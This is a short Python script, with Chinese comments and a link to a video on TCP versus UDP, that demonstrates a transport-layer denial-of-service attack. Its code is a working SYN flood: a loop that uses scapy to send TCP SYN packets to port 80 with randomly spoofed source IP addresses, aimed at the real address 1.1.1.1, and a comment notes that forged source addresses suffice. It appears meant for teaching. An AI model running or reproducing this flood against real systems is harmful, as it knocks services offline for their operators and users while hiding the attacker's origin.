"""
   传输层的拒绝服务攻击：
      基于TCP的拒绝服务攻击：全连接和半连接.
      TCP和UDP的区别：https://www.bilibili.com/video/BV1kV411j7hA

"""
import sys,random
from scapy.all import send,IP,TCP
while 1:#半连接攻击，无需使用自身的IP地址作为源地址，只需要使用伪造的地址即可
   psrc= "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
   pdst= "1.1.1.1"
   send(IP(src=psrc,dst=pdst)/TCP(dport=80, flags="S"))